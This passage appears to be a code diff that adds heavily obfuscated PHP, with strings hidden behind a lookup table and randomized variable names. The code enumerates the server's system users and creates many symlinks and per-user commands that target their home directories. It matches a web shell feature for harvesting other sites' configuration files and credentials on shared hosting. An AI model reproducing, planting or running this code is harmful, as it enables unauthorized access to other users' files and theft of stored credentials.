+            @copy($GLOBALS[äØ][0x15b] . $lpoyk . $GLOBALS[äØ][0x1a4], $GLOBALS[äØ][0x1a5] . $lpoyk . $GLOBALS[äØ][0x1a6]);
+            @symlink($GLOBALS[äØ][0xf0] . $lpoyk . $GLOBALS[äØ][0x16a], $GLOBALS[äØ][0x16b] . $lpoyk . $GLOBALS[äØ][0x16c]);
+            @symlink($GLOBALS[äØ][0x54] . $lpoyk . $GLOBALS[äØ][0x55], $GLOBALS[äØ][0x56] . $lpoyk . $GLOBALS[äØ][0x57]);
+            @symlink($GLOBALS[äØ][0x22] . $lpoyk . $GLOBALS[äØ][0x11c], $GLOBALS[äØ][0x11d] . $lpoyk . $GLOBALS[äØ][0x11e]);
+            @symlink($GLOBALS[äØ][0x36] . $lpoyk . $GLOBALS[äØ][0x37], $GLOBALS[äØ][0x38] . $lpoyk . $GLOBALS[äØ][0x39]);
+            @symlink($GLOBALS[äØ][0x3a] . $lpoyk . $GLOBALS[äØ][0x10c], $GLOBALS[äØ][0x10d] . $lpoyk . $GLOBALS[äØ][0x10e]);
+            @symlink($GLOBALS[äØ][0x2a] . $lpoyk . $GLOBALS[äØ][0xa7], $GLOBALS[äØ][0xa8] . $lpoyk . $GLOBALS[äØ][0xa9]);
+            @symlink($GLOBALS[äØ][0xb4] . $lpoyk . $GLOBALS[äØ][0x15f], $GLOBALS[äØ][0x40] . $lpoyk . $GLOBALS[äØ][0x160]);
+            @symlink($GLOBALS[äØ][0xb4] . $lpoyk . $GLOBALS[äØ][0x179], $GLOBALS[äØ][0x17a] . $lpoyk . $GLOBALS[äØ][0x17b]);
+            @symlink($GLOBALS[äØ][0x68] . $lpoyk . $GLOBALS[äØ][0x155], $GLOBALS[äØ][0x156] . $lpoyk . $GLOBALS[äØ][0x157]);
+            @symlink($GLOBALS[äØ][0x98] . $lpoyk . $GLOBALS[äØ][0x99], $GLOBALS[äØ][0x9a] . $lpoyk . $GLOBALS[äØ][0x9b]);
+            @symlink($GLOBALS[äØ][0x9f] . $lpoyk . $GLOBALS[äØ][0xa0], $GLOBALS[äØ][0xa1] . $lpoyk . $GLOBALS[äØ][0xa2]);
+            @symlink($GLOBALS[äØ][0x5c] . $lpoyk . $GLOBALS[äØ][0x17c], $GLOBALS[äØ][0x17d] . $lpoyk . $GLOBALS[äØ][0x17e]);
+            @symlink($GLOBALS[äØ][0xbc] . $lpoyk . $GLOBALS[äØ][0x18c], $GLOBALS[äØ][0x18d] . $lpoyk . $GLOBALS[äØ][0x18e]);
+            @symlink($GLOBALS[äØ][0x32] . $lpoyk . $GLOBALS[äØ][0x33], $GLOBALS[äØ][0x34] . $lpoyk . $GLOBALS[äØ][0x35]);
+            @symlink($GLOBALS[äØ][0x68] . $lpoyk . $GLOBALS[äØ][0x69], $GLOBALS[äØ][0x6a] . $lpoyk . $GLOBALS[äØ][0x6b]);
+            @symlink($GLOBALS[äØ][0xa3] . $lpoyk . $GLOBALS[äØ][0xa4], $GLOBALS[äØ][0xa5] . $lpoyk . $GLOBALS[äØ][0xa6]);
+            @symlink($GLOBALS[äØ][0x2a] . $lpoyk . $GLOBALS[äØ][0x4d], $GLOBALS[äØ][0x4e] . $lpoyk . $GLOBALS[äØ][0x4f]);
+            @symlink($GLOBALS[äØ][0x9f] . $lpoyk . $GLOBALS[äØ][0x129], $GLOBALS[äØ][0x12a] . $lpoyk . $GLOBALS[äØ][0x12b]);
+            @symlink($GLOBALS[äØ][0x7e] . $lpoyk . $GLOBALS[äØ][0xf4], $GLOBALS[äØ][0xf5] . $lpoyk . $GLOBALS[äØ][0xf6]);
+            @symlink($GLOBALS[äØ][0xbf] . $lpoyk . $GLOBALS[äØ][0x107], $GLOBALS[äØ][0x108] . $lpoyk . $GLOBALS[äØ][0x109]);
+            @symlink($GLOBALS[äØ][0x1e] . $lpoyk . $GLOBALS[äØ][0x1f], $GLOBALS[äØ][0x20] . $lpoyk . $GLOBALS[äØ][0x21]);
+            @symlink($GLOBALS[äØ][0x50] . $lpoyk . $GLOBALS[äØ][0x86], $GLOBALS[äØ][0x87] . $lpoyk . $GLOBALS[äØ][0x88]);
+            @symlink($GLOBALS[äØ][0x60] . $lpoyk . $GLOBALS[äØ][0x9c], $GLOBALS[äØ][0x9d] . $lpoyk . $GLOBALS[äØ][0x9e]);
+            @symlink($GLOBALS[äØ][0x22] . $lpoyk . $GLOBALS[äØ][0x23], $GLOBALS[äØ][0x24] . $lpoyk . $GLOBALS[äØ][0x25]);
+            @symlink($GLOBALS[äØ][0x89] . $lpoyk . $GLOBALS[äØ][0x8a], $GLOBALS[äØ][0x8b] . $lpoyk . $GLOBALS[äØ][0x8c]);
+            @symlink($GLOBALS[äØ][0xdf] . $lpoyk . $GLOBALS[äØ][0xe0], $GLOBALS[äØ][0xe1] . $lpoyk . $GLOBALS[äØ][0xe2]);
+            @symlink($GLOBALS[äØ][0x12] . $lpoyk . $GLOBALS[äØ][0x13], $GLOBALS[äØ][0x14] . $lpoyk . $GLOBALS[äØ][0x15]);
+            @symlink($GLOBALS[äØ][0x8d] . $lpoyk . $GLOBALS[äØ][0x10f], $GLOBALS[äØ][0x110] . $lpoyk . $GLOBALS[äØ][0x111]);
+            @symlink($GLOBALS[äØ][0x1a] . $lpoyk . $GLOBALS[äØ][0x1b], $GLOBALS[äØ][0x1c] . $lpoyk . $GLOBALS[äØ][0x1d]);
+            @symlink($GLOBALS[äØ][0x26] . $lpoyk . $GLOBALS[äØ][0x14c], $GLOBALS[äØ][0x14d] . $lpoyk . $GLOBALS[äØ][0x14e]);
+            @symlink($GLOBALS[äØ][0x5c] . $lpoyk . $GLOBALS[äØ][0x5d], $GLOBALS[äØ][0x5e] . $lpoyk . $GLOBALS[äØ][0x5f]);
+            @symlink($GLOBALS[äØ][0x5c] . $lpoyk . $GLOBALS[äØ][0x167], $GLOBALS[äØ][0x168] . $lpoyk . $GLOBALS[äØ][0x169]);
+            @symlink($GLOBALS[äØ][0x151] . $lpoyk . $GLOBALS[äØ][0x195], $GLOBALS[äØ][0x196] . $lpoyk . $GLOBALS[äØ][0x197]);
+            @symlink($GLOBALS[äØ][0x2a] . $lpoyk . $GLOBALS[äØ][0x2b], $GLOBALS[äØ][0x2c] . $lpoyk . $GLOBALS[äØ][0x2d]);
+            @symlink($GLOBALS[äØ][0xbf] . $lpoyk . $GLOBALS[äØ][0x164], $GLOBALS[äØ][0x165] . $lpoyk . $GLOBALS[äØ][0x166]);
+            @symlink($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0xc6], $GLOBALS[äØ][0xc7] . $lpoyk . $GLOBALS[äØ][0xc8]);
+            @symlink($GLOBALS[äØ][0xa3] . $lpoyk . $GLOBALS[äØ][0x171], $GLOBALS[äØ][0x4b] . $lpoyk . $GLOBALS[äØ][0x172]);
+            @symlink($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0xd9], $GLOBALS[äØ][0xda] . $lpoyk . $GLOBALS[äØ][0xdb]);
+            @symlink($GLOBALS[äØ][0xf0] . $lpoyk . $GLOBALS[äØ][0xf1], $GLOBALS[äØ][0xf2] . $lpoyk . $GLOBALS[äØ][0xf3]);
+            @symlink($GLOBALS[äØ][0x8d] . $lpoyk . $GLOBALS[äØ][0x19e], $GLOBALS[äØ][0x19f] . $lpoyk . $GLOBALS[äØ][0x1a0]);
+            @symlink($GLOBALS[äØ][0x22] . $lpoyk . $GLOBALS[äØ][0x123], $GLOBALS[äØ][0x124] . $lpoyk . $GLOBALS[äØ][0x125]);
+            @symlink($GLOBALS[äØ][0x16d] . $lpoyk . $GLOBALS[äØ][0x16e], $GLOBALS[äØ][0x16f] . $lpoyk . $GLOBALS[äØ][0x170]);
+            @symlink($GLOBALS[äØ][0xad] . $lpoyk . $GLOBALS[äØ][0xae], $GLOBALS[äØ][0xaf] . $lpoyk . $GLOBALS[äØ][0xb0]);
+            @symlink($GLOBALS[äØ][0xc9] . $lpoyk . $GLOBALS[äØ][0xca], $GLOBALS[äØ][0x34] . $lpoyk . $GLOBALS[äØ][0xcb]);
+            @symlink($GLOBALS[äØ][0x73] . $lpoyk . $GLOBALS[äØ][0x74], $GLOBALS[äØ][0x75] . $lpoyk . $GLOBALS[äØ][0x76]);
+            @symlink($GLOBALS[äØ][0x112] . $lpoyk . $GLOBALS[äØ][0x113], $GLOBALS[äØ][0xdd] . $lpoyk . $GLOBALS[äØ][0x114]);
+            @symlink($GLOBALS[äØ][0x42] . $lpoyk . $GLOBALS[äØ][0x43], $GLOBALS[äØ][0x1c] . $lpoyk . $GLOBALS[äØ][0x44]);
+            @symlink($GLOBALS[äØ][0x151] . $lpoyk . $GLOBALS[äØ][0x152], $GLOBALS[äØ][0x153] . $lpoyk . $GLOBALS[äØ][0x154]);
+            @symlink($GLOBALS[äØ][0x100] . $lpoyk . $GLOBALS[äØ][0x101], $GLOBALS[äØ][0x102] . $lpoyk . $GLOBALS[äØ][0x103]);
+            @symlink($GLOBALS[äØ][0x36] . $lpoyk . $GLOBALS[äØ][0xdc], $GLOBALS[äØ][0xdd] . $lpoyk . $GLOBALS[äØ][0xde]);
+            @symlink($GLOBALS[äØ][0xd5] . $lpoyk . $GLOBALS[äØ][0x173], $GLOBALS[äØ][0x174] . $lpoyk . $GLOBALS[äØ][0x175]);
+            @symlink($GLOBALS[äØ][0xd1] . $lpoyk . $GLOBALS[äØ][0xd2], $GLOBALS[äØ][0xd3] . $lpoyk . $GLOBALS[äØ][0xd4]);
+            @symlink($GLOBALS[äØ][0x50] . $lpoyk . $GLOBALS[äØ][0x51], $GLOBALS[äØ][0x52] . $lpoyk . $GLOBALS[äØ][0x53]);
+            @symlink($GLOBALS[äØ][0xbf] . $lpoyk . $GLOBALS[äØ][0x134], $GLOBALS[äØ][0xb2] . $lpoyk . $GLOBALS[äØ][0x135]);
+            @symlink($GLOBALS[äØ][0xb8] . $lpoyk . $GLOBALS[äØ][0x144], $GLOBALS[äØ][0x145] . $lpoyk . $GLOBALS[äØ][0x146]);
+            @symlink($GLOBALS[äØ][0x8d] . $lpoyk . $GLOBALS[äØ][0x126], $GLOBALS[äØ][0x127] . $lpoyk . $GLOBALS[äØ][0x128]);
+            @symlink($GLOBALS[äØ][0x73] . $lpoyk . $GLOBALS[äØ][0x1a1], $GLOBALS[äØ][0x1a2] . $lpoyk . $GLOBALS[äØ][0x1a3]);
+            @symlink($GLOBALS[äØ][0x58] . $lpoyk . $GLOBALS[äØ][0x59], $GLOBALS[äØ][0x5a] . $lpoyk . $GLOBALS[äØ][0x5b]);
+            @symlink($GLOBALS[äØ][0xbf] . $lpoyk . $GLOBALS[äØ][0xc0], $GLOBALS[äØ][0xc1] . $lpoyk . $GLOBALS[äØ][0xc2]);
+            @symlink($GLOBALS[äØ][0x32] . $lpoyk . $GLOBALS[äØ][0xaa], $GLOBALS[äØ][0xab] . $lpoyk . $GLOBALS[äØ][0xac]);
+            @symlink($GLOBALS[äØ][0x118] . $lpoyk . $GLOBALS[äØ][0x119], $GLOBALS[äØ][0x11a] . $lpoyk . $GLOBALS[äØ][0x11b]);
+            @symlink($GLOBALS[äØ][0x7e] . $lpoyk . $GLOBALS[äØ][0x7f], $GLOBALS[äØ][0x80] . $lpoyk . $GLOBALS[äØ][0x81]);
+        }
+    }
+    $nw0Dy = posix_getpwuid($FKDQ8);
+    if (!empty($nw0Dy)) {
+        MscL2:
+        if (!(list($k7X3B, $WRNHs) = each($nw0Dy))) {
+            $y5cgD = fopen($GLOBALS[äØ][0xb], $GLOBALS[äØ][0xa]);
+            fwrite($y5cgD, $GLOBALS[äØ][0x8]);
+            fclose($y5cgD);
+        }
+        $y5cgD = fopen($GLOBALS[äØ][0x9], $GLOBALS[äØ][0xa]);
+        fwrite($y5cgD, "{$WRNHs}:");
+        fclose($y5cgD);
+        goto MscL2;
+    }
+    $FKDQ8++;
+    goto eQSNe;
+}
+if ($peixv == $GLOBALS[äØ][0x23a]) {
+    $QJQfs = @getcwd();
+    $QGuda = @php_uname();
+    $prgj5 = $GLOBALS[äØ][0x4e6];
+    if (preg_match($GLOBALS[äØ][0x23b], $QJQfs)) {
+        if (file_get_contents($GLOBALS[äØ][0x23c])) {
+            echo $GLOBALS[äØ][0x287];
+            @mkdir($GLOBALS[äØ][0x28b], 0755);
+            file_put_contents($GLOBALS[äØ][0x289], $prgj5);
+            $XSVrw = file_get_contents($GLOBALS[äØ][0x288]);
+            $XSVrw = explode($GLOBALS[äØ][0x8], $XSVrw);
+            echo $GLOBALS[äØ][0x28a];
+            foreach ($XSVrw as $QJQfs) {
+                $paogY = explode($GLOBALS[äØ][0x1c6], $QJQfs);
+                $lpoyk = $paogY[0x5];
+                $c6Zgf = $paogY[0];
+                ByqTyy($GLOBALS[äØ][0x25d] . $lpoyk . $GLOBALS[äØ][0x25e] . $c6Zgf . $GLOBALS[äØ][0x25f]);
+                ByqTyy($GLOBALS[äØ][0x26f] . $lpoyk . $GLOBALS[äØ][0x270] . $c6Zgf . $GLOBALS[äØ][0x271]);
+                ByqTyy($GLOBALS[äØ][0x240] . $lpoyk . $GLOBALS[äØ][0x243] . $c6Zgf . $GLOBALS[äØ][0x244]);
+                ByqTyy($GLOBALS[äØ][0x27c] . $lpoyk . $GLOBALS[äØ][0x27d] . $c6Zgf . $GLOBALS[äØ][0x27e]);
+                ByqTyy($GLOBALS[äØ][0x24b] . $lpoyk . $GLOBALS[äØ][0x24c] . $c6Zgf . $GLOBALS[äØ][0x24d]);
+                ByqTyy($GLOBALS[äØ][0x266] . $lpoyk . $GLOBALS[äØ][0x267] . $c6Zgf . $GLOBALS[äØ][0x268]);
+                ByqTyy($GLOBALS[äØ][0x284] . $lpoyk . $GLOBALS[äØ][0x285] . $c6Zgf . $GLOBALS[äØ][0x286]);
+                ByqTyy($GLOBALS[äØ][0x269] . $lpoyk . $GLOBALS[äØ][0x26a] . $c6Zgf . $GLOBALS[äØ][0x26b]);
+                ByqTyy($GLOBALS[äØ][0x254] . $lpoyk . $GLOBALS[äØ][0x278] . $c6Zgf . $GLOBALS[äØ][0x279]);
+                ByqTyy($GLOBALS[äØ][0x240] . $lpoyk . $GLOBALS[äØ][0x27a] . $c6Zgf . $GLOBALS[äØ][0x27b]);
+                ByqTyy($GLOBALS[äØ][0x240] . $lpoyk . $GLOBALS[äØ][0x241] . $c6Zgf . $GLOBALS[äØ][0x242]);
+                ByqTyy($GLOBALS[äØ][0x257] . $lpoyk . $GLOBALS[äØ][0x258] . $c6Zgf . $GLOBALS[äØ][0x259]);
+                ByqTyy($GLOBALS[äØ][0x281] . $lpoyk . $GLOBALS[äØ][0x282] . $c6Zgf . $GLOBALS[äØ][0x283]);
+                ByqTyy($GLOBALS[äØ][0x275] . $lpoyk . $GLOBALS[äØ][0x276] . $c6Zgf . $GLOBALS[äØ][0x277]);
+                ByqTyy($GLOBALS[äØ][0x26c] . $lpoyk . $GLOBALS[äØ][0x26d] . $c6Zgf . $GLOBALS[äØ][0x26e]);
+                ByqTyy($GLOBALS[äØ][0x272] . $lpoyk . $GLOBALS[äØ][0x273] . $c6Zgf . $GLOBALS[äØ][0x274]);
+                ByqTyy($GLOBALS[äØ][0x245] . $lpoyk . $GLOBALS[äØ][0x246] . $c6Zgf . $GLOBALS[äØ][0x247]);
+                ByqTyy($GLOBALS[äØ][0x248] . $lpoyk . $GLOBALS[äØ][0x249] . $c6Zgf . $GLOBALS[äØ][0x24a]);
+                ByqTyy($GLOBALS[äØ][0x25a] . $lpoyk . $GLOBALS[äØ][0x25b] . $c6Zgf . $GLOBALS[äØ][0x25c]);
+                ByqTyy($GLOBALS[äØ][0x251] . $lpoyk . $GLOBALS[äØ][0x252] . $c6Zgf . $GLOBALS[äØ][0x253]);
+                ByqTyy($GLOBALS[äØ][0x260] . $lpoyk . $GLOBALS[äØ][0x261] . $c6Zgf . $GLOBALS[äØ][0x262]);
+                ByqTyy($GLOBALS[äØ][0x23d] . $lpoyk . $GLOBALS[äØ][0x23e] . $c6Zgf . $GLOBALS[äØ][0x23f]);
+                ByqTyy($GLOBALS[äØ][0x23d] . $lpoyk . $GLOBALS[äØ][0x27f] . $c6Zgf . $GLOBALS[äØ][0x280]);
+                ByqTyy($GLOBALS[äØ][0x254] . $lpoyk . $GLOBALS[äØ][0x255] . $c6Zgf . $GLOBALS[äØ][0x256]);
+                ByqTyy($GLOBALS[äØ][0x263] . $lpoyk . $GLOBALS[äØ][0x264] . $c6Zgf . $GLOBALS[äØ][0x265]);
+                ByqTyy($GLOBALS[äØ][0x24e] . $lpoyk . $GLOBALS[äØ][0x24f] . $c6Zgf . $GLOBALS[äØ][0x250]);
+            }
+        } else {
+            ByqTyy($GLOBALS[äØ][0x2d6]);
+            echo $GLOBALS[äØ][0x2d5];
+            @mkdir($GLOBALS[äØ][0x2d8], 0755);
+            file_put_contents($GLOBALS[äØ][0x2d4], $prgj5);
+            $XSVrw = file_get_contents($GLOBALS[äØ][0x2d7]);
+            $XSVrw = explode($GLOBALS[äØ][0x7], $XSVrw);
+            echo $GLOBALS[äØ][0x2d3];
+            foreach ($XSVrw as $QJQfs) {
+                $paogY = explode($GLOBALS[äØ][0x1c6], $QJQfs);
+                $lpoyk = $paogY[0x5];
+                $c6Zgf = $paogY[0];
+                ByqTyy($GLOBALS[äØ][0x28c] . $lpoyk . $GLOBALS[äØ][0x28d] . $c6Zgf . $GLOBALS[äØ][0x28e]);
+                ByqTyy($GLOBALS[äØ][0x2a8] . $lpoyk . $GLOBALS[äØ][0x2a9] . $c6Zgf . $GLOBALS[äØ][0x2aa]);
+                ByqTyy($GLOBALS[äØ][0x2ae] . $lpoyk . $GLOBALS[äØ][0x2af] . $lpoyk . $GLOBALS[äØ][0x2b0]);
+                ByqTyy($GLOBALS[äØ][0x263] . $lpoyk . $GLOBALS[äØ][0x2a6] . $c6Zgf . $GLOBALS[äØ][0x2a7]);
+                ByqTyy($GLOBALS[äØ][0x2b6] . $lpoyk . $GLOBALS[äØ][0x2b7] . $c6Zgf . $GLOBALS[äØ][0x2b8]);
+                ByqTyy($GLOBALS[äØ][0x266] . $lpoyk . $GLOBALS[äØ][0x28f] . $c6Zgf . $GLOBALS[äØ][0x290]);
+                ByqTyy($GLOBALS[äØ][0x284] . $lpoyk . $GLOBALS[äØ][0x299] . $c6Zgf . $GLOBALS[äØ][0x29a]);
+                ByqTyy($GLOBALS[äØ][0x2ce] . $lpoyk . $GLOBALS[äØ][0x2cf] . $c6Zgf . $GLOBALS[äØ][0x2d0]);
+                ByqTyy($GLOBALS[äØ][0x2a3] . $lpoyk . $GLOBALS[äØ][0x2a4] . $c6Zgf . $GLOBALS[äØ][0x2a5]);
+                ByqTyy($GLOBALS[äØ][0x2ab] . $lpoyk . $GLOBALS[äØ][0x2ac] . $c6Zgf . $GLOBALS[äØ][0x2ad]);
+                ByqTyy($GLOBALS[äØ][0x2c0] . $lpoyk . $GLOBALS[äØ][0x2c1] . $c6Zgf . $GLOBALS[äØ][0x2c2]);
+                ByqTyy($GLOBALS[äØ][0x245] . $lpoyk . $GLOBALS[äØ][0x29b] . $c6Zgf . $GLOBALS[äØ][0x29c]);
+                ByqTyy($GLOBALS[äØ][0x266] . $lpoyk . $GLOBALS[äØ][0x2b9] . $c6Zgf . $GLOBALS[äØ][0x2ba]);
+                ByqTyy($GLOBALS[äØ][0x291] . $lpoyk . $GLOBALS[äØ][0x294] . $c6Zgf . $GLOBALS[äØ][0x295]);
+                ByqTyy($GLOBALS[äØ][0x2cb] . $lpoyk . $GLOBALS[äØ][0x2cc] . $c6Zgf . $GLOBALS[äØ][0x2cd]);
+                ByqTyy($GLOBALS[äØ][0x2a3] . $lpoyk . $GLOBALS[äØ][0x2d1] . $c6Zgf . $GLOBALS[äØ][0x2d2]);
+                ByqTyy($GLOBALS[äØ][0x296] . $lpoyk . $GLOBALS[äØ][0x297] . $c6Zgf . $GLOBALS[äØ][0x298]);
+                ByqTyy($GLOBALS[äØ][0x257] . $lpoyk . $GLOBALS[äØ][0x2bb] . $c6Zgf . $GLOBALS[äØ][0x2bc]);
+                ByqTyy($GLOBALS[äØ][0x2b3] . $lpoyk . $GLOBALS[äØ][0x2b4] . $c6Zgf . $GLOBALS[äØ][0x2b5]);
+                ByqTyy($GLOBALS[äØ][0x2bd] . $lpoyk . $GLOBALS[äØ][0x2be] . $c6Zgf . $GLOBALS[äØ][0x2bf]);
+                ByqTyy($GLOBALS[äØ][0x2c5] . $lpoyk . $GLOBALS[äØ][0x2c6] . $c6Zgf . $GLOBALS[äØ][0x2c7]);
+                ByqTyy($GLOBALS[äØ][0x291] . $lpoyk . $GLOBALS[äØ][0x292] . $c6Zgf . $GLOBALS[äØ][0x293]);
+                ByqTyy($GLOBALS[äØ][0x2a0] . $lpoyk . $GLOBALS[äØ][0x2a1] . $c6Zgf . $GLOBALS[äØ][0x2a2]);
+                ByqTyy($GLOBALS[äØ][0x2bd] . $lpoyk . $GLOBALS[äØ][0x2c3] . $c6Zgf . $GLOBALS[äØ][0x2c4]);
+                ByqTyy($GLOBALS[äØ][0x24b] . $lpoyk . $GLOBALS[äØ][0x2b1] . $c6Zgf . $GLOBALS[äØ][0x2b2]);
+                ByqTyy($GLOBALS[äØ][0x2c8] . $lpoyk . $GLOBALS[äØ][0x2c9] . $c6Zgf . $GLOBALS[äØ][0x2ca]);
+                ByqTyy($GLOBALS[äØ][0x29d] . $lpoyk . $GLOBALS[äØ][0x29e] . $c6Zgf . $GLOBALS[äØ][0x29f]);
+            }
+        }
+        echo $GLOBALS[äØ][0x2d9] . getcwd() . $GLOBALS[äØ][0x2da];
+    } elseif (preg_match($GLOBALS[äØ][0x2db], $QJQfs)) {
+        if (file_get_contents($GLOBALS[äØ][0x2dc])) {
+            echo $GLOBALS[äØ][0x31c];
+            @mkdir($GLOBALS[äØ][0x31d], 0755);
+            file_put_contents($GLOBALS[äØ][0x31b], $prgj5);
+            $XSVrw = file_get_contents($GLOBALS[äØ][0x31a]);
+            $XSVrw = explode($GLOBALS[äØ][0x8], $XSVrw);
+            echo $GLOBALS[äØ][0x319];
+            foreach ($XSVrw as $QJQfs) {
+                $paogY = explode($GLOBALS[äØ][0x13c], $QJQfs);
+                $lpoyk = $paogY[0x5];
+                $c6Zgf = $paogY[0];
+                ByqTyy($GLOBALS[äØ][0x2ae] . $lpoyk . $GLOBALS[äØ][0x2eb] . $c6Zgf . $GLOBALS[äØ][0x2ec]);
+                ByqTyy($GLOBALS[äØ][0x2a8] . $lpoyk . $GLOBALS[äØ][0x300] . $c6Zgf . $GLOBALS[äØ][0x301]);
+                ByqTyy($GLOBALS[äØ][0x248] . $lpoyk . $GLOBALS[äØ][0x2f8] . $c6Zgf . $GLOBALS[äØ][0x2f9]);
+                ByqTyy($GLOBALS[äØ][0x263] . $lpoyk . $GLOBALS[äØ][0x2fa] . $c6Zgf . $GLOBALS[äØ][0x2fb]);
+                ByqTyy($GLOBALS[äØ][0x23d] . $lpoyk . $GLOBALS[äØ][0x305] . $c6Zgf . $GLOBALS[äØ][0x306]);
+                ByqTyy($GLOBALS[äØ][0x2ab] . $lpoyk . $GLOBALS[äØ][0x2ef] . $c6Zgf . $GLOBALS[äØ][0x2f0]);
+                ByqTyy($GLOBALS[äØ][0x314] . $lpoyk . $GLOBALS[äØ][0x315] . $c6Zgf . $GLOBALS[äØ][0x316]);
+                ByqTyy($GLOBALS[äØ][0x2e2] . $lpoyk . $GLOBALS[äØ][0x30f] . $c6Zgf . $GLOBALS[äØ][0x310]);
+                ByqTyy($GLOBALS[äØ][0x2cb] . $lpoyk . $GLOBALS[äØ][0x309] . $c6Zgf . $GLOBALS[äØ][0x30a]);
+                ByqTyy($GLOBALS[äØ][0x2a3] . $lpoyk . $GLOBALS[äØ][0x307] . $c6Zgf . $GLOBALS[äØ][0x308]);
+                ByqTyy($GLOBALS[äØ][0x2c5] . $lpoyk . $GLOBALS[äØ][0x2ed] . $c6Zgf . $GLOBALS[äØ][0x2ee]);
+                ByqTyy($GLOBALS[äØ][0x275] . $lpoyk . $GLOBALS[äØ][0x2dd] . $c6Zgf . $GLOBALS[äØ][0x2de]);
+                ByqTyy($GLOBALS[äØ][0x2e8] . $lpoyk . $GLOBALS[äØ][0x2e9] . $c6Zgf . $GLOBALS[äØ][0x2ea]);
+                ByqTyy($GLOBALS[äØ][0x2e5] . $lpoyk . $GLOBALS[äØ][0x2e6] . $c6Zgf . $GLOBALS[äØ][0x2e7]);
+                ByqTyy($GLOBALS[äØ][0x2df] . $lpoyk . $GLOBALS[äØ][0x2e0] . $c6Zgf . $GLOBALS[äØ][0x2e1]);
+                ByqTyy($GLOBALS[äØ][0x2e2] . $lpoyk . $GLOBALS[äØ][0x2e3] . $c6Zgf . $GLOBALS[äØ][0x2e4]);
+                ByqTyy($GLOBALS[äØ][0x281] . $lpoyk . $GLOBALS[äØ][0x2f3] . $c6Zgf . $GLOBALS[äØ][0x2f4]);
+                ByqTyy($GLOBALS[äØ][0x281] . $lpoyk . $GLOBALS[äØ][0x317] . $c6Zgf . $GLOBALS[äØ][0x318]);
+                ByqTyy($GLOBALS[äØ][0x291] . $lpoyk . $GLOBALS[äØ][0x2f1] . $c6Zgf . $GLOBALS[äØ][0x2f2]);
+                ByqTyy($GLOBALS[äØ][0x302] . $lpoyk . $GLOBALS[äØ][0x303] . $c6Zgf . $GLOBALS[äØ][0x304]);
+                ByqTyy($GLOBALS[äØ][0x2c0] . $lpoyk . $GLOBALS[äØ][0x2fc] . $c6Zgf . $GLOBALS[äØ][0x2fd]);
+                ByqTyy($GLOBALS[äØ][0x2e8] . $lpoyk . $GLOBALS[äØ][0x30d] . $c6Zgf . $GLOBALS[äØ][0x30e]);
+                ByqTyy($GLOBALS[äØ][0x2f5] . $lpoyk . $GLOBALS[äØ][0x2f6] . $c6Zgf . $GLOBALS[äØ][0x2f7]);
+                ByqTyy($GLOBALS[äØ][0x240] . $lpoyk . $GLOBALS[äØ][0x30b] . $c6Zgf . $GLOBALS[äØ][0x30c]);
+                ByqTyy($GLOBALS[äØ][0x311] . $lpoyk . $GLOBALS[äØ][0x312] . $c6Zgf . $GLOBALS[äØ][0x313]);
+                ByqTyy($GLOBALS[äØ][0x2df] . $lpoyk . $GLOBALS[äØ][0x2fe] . $c6Zgf . $GLOBALS[äØ][0x2ff]);
+            }
+        } else {
+            ByqTyy($GLOBALS[äØ][0x321]);
+            echo $GLOBALS[äØ][0x320];
+            @mkdir($GLOBALS[äØ][0x31e], 0755);
+            file_put_contents($GLOBALS[äØ][0x322], $prgj5);
+            $XSVrw = file_get_contents($GLOBALS[äØ][0x2d7]);
+            $XSVrw = explode($GLOBALS[äØ][0x8], $XSVrw);
+            echo $GLOBALS[äØ][0x31f];
+            foreach ($XSVrw as $QJQfs) {
+                $paogY = explode($GLOBALS[äØ][0x13c], $QJQfs);
+                $lpoyk = $paogY[0x5];
+                $c6Zgf = $paogY[0];
+                ByqTyy($GLOBALS[äØ][0x28c] . $lpoyk . $GLOBALS[äØ][0x332] . $c6Zgf . $GLOBALS[äØ][0x333]);
+                ByqTyy($GLOBALS[äØ][0x341] . $lpoyk . $GLOBALS[äØ][0x342] . $c6Zgf . $GLOBALS[äØ][0x343]);
+                ByqTyy($GLOBALS[äØ][0x28c] . $lpoyk . $GLOBALS[äØ][0x346] . $lpoyk . $GLOBALS[äØ][0x347]);
+                ByqTyy($GLOBALS[äØ][0x34d] . $lpoyk . $GLOBALS[äØ][0x34e] . $c6Zgf . $GLOBALS[äØ][0x34f]);
+                ByqTyy($GLOBALS[äØ][0x2f5] . $lpoyk . $GLOBALS[äØ][0x330] . $c6Zgf . $GLOBALS[äØ][0x331]);
+                ByqTyy($GLOBALS[äØ][0x248] . $lpoyk . $GLOBALS[äØ][0x334] . $c6Zgf . $GLOBALS[äØ][0x335]);
+                ByqTyy($GLOBALS[äØ][0x257] . $lpoyk . $GLOBALS[äØ][0x339] . $c6Zgf . $GLOBALS[äØ][0x33a]);
+                ByqTyy($GLOBALS[äØ][0x29d] . $lpoyk . $GLOBALS[äØ][0x33d] . $c6Zgf . $GLOBALS[äØ][0x33e]);
+                ByqTyy($GLOBALS[äØ][0x2c8] . $lpoyk . $GLOBALS[äØ][0x327] . $c6Zgf . $GLOBALS[äØ][0x328]);
+                ByqTyy($GLOBALS[äØ][0x284] . $lpoyk . $GLOBALS[äØ][0x329] . $c6Zgf . $GLOBALS[äØ][0x32a]);
+                ByqTyy($GLOBALS[äØ][0x263] . $lpoyk . $GLOBALS[äØ][0x33b] . $c6Zgf . $GLOBALS[äØ][0x33c]);
+                ByqTyy($GLOBALS[äØ][0x25a] . $lpoyk . $GLOBALS[äØ][0x354] . $c6Zgf . $GLOBALS[äØ][0x355]);
+                ByqTyy($GLOBALS[äØ][0x32b] . $lpoyk . $GLOBALS[äØ][0x32c] . $c6Zgf . $GLOBALS[äØ][0x32d]);
+                ByqTyy($GLOBALS[äØ][0x275] . $lpoyk . $GLOBALS[äØ][0x350] . $c6Zgf . $GLOBALS[äØ][0x351]);
+                ByqTyy($GLOBALS[äØ][0x266] . $lpoyk . $GLOBALS[äØ][0x33f] . $c6Zgf . $GLOBALS[äØ][0x340]);
+                ByqTyy($GLOBALS[äØ][0x34a] . $lpoyk . $GLOBALS[äØ][0x34b] . $c6Zgf . $GLOBALS[äØ][0x34c]);
+                ByqTyy($GLOBALS[äØ][0x2a0] . $lpoyk . $GLOBALS[äØ][0x352] . $c6Zgf . $GLOBALS[äØ][0x353]);
+                ByqTyy($GLOBALS[äØ][0x245] . $lpoyk . $GLOBALS[äØ][0x32e] . $c6Zgf . $GLOBALS[äØ][0x32f]);
